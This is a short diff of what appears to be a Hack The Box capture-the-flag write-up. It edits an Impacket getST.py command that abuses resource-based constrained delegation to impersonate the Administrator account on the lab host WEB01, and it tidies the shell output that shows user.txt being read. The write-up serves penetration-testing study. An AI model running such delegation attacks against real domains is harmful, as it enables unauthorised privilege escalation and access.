@@ -326,7 +326,7 @@ We now control `VYSHKGDW$`, which is explicitly trusted by `WEB01` for delegatio
 We ask the Domain Controller for a Service Ticket to the `cifs` service on `WEB01`, asserting that we want to act on behalf of the `Administrator` user. Because of the RBCD configuration we just injected, the KDC issues the ticket.
 
 ```bash
-getST.py -spn 'cifs/WEB01.pirate.htb' -impersonate 'Administrator' 'pirate.htb/VYSHKGDW$:8j3I/8s}rOYPLRE' -dc-ip 10.129.4.86
+getST.py -spn 'cifs/WEB01.pirate.htb' -impersonate 'Administrator' 'pirate.htb/BWLQRATL$:+wUYnh>lh.f7lkX' -dc-ip 10.129.4.86
 
 export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
 ```
@@ -353,7 +353,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [!] Press help for extra shell commands                                                                   
 Microsoft Windows [Version 10.0.17763.8385]                                                                
 (c) 2018 Microsoft Corporation. All rights reserved.                                                   
-C:\WINDOWS\system32>C:\Users\a.white\Desktop> type user.txt
+C:\Users\a.white\Desktop> type user.txt
 61659bXXXXXXXXXXXXXXXXXXXXX
 ```
 
